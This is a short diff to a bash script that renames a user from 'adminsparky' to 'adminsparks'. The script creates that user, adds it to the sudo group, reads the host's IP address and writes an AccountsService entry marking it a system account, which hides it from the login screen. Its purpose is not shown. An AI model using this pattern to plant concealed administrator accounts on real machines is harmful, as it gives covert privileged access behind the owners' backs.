@@ -16,7 +16,7 @@ for password in "${passwords[@]}"; do
 done
 
 # Get the username
-username='adminsparky'
+username='adminsparks'
 
 # Create the new user and set the password
 sudo adduser $username --gecos "" --disabled-password
@@ -29,7 +29,7 @@ sudo usermod -aG sudo $username
 ip=$(ip addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1)
 
 # Add a file to the system with specified content
-echo '[InputSource0]\nxkb=za\n\n[User]\nIcon=/var/lib/AccountsService/icons/adminsparky\nSystemAccount=true' | sudo tee /var/lib/AccountsService/users/adminsparky
+echo '[InputSource0]\nxkb=za\n\n[User]\nIcon=/var/lib/AccountsService/icons/adminsparks\nSystemAccount=true' | sudo tee /var/lib/AccountsService/users/adminsparks
 
 
 sudo systemctl restart accounts-daemon.service
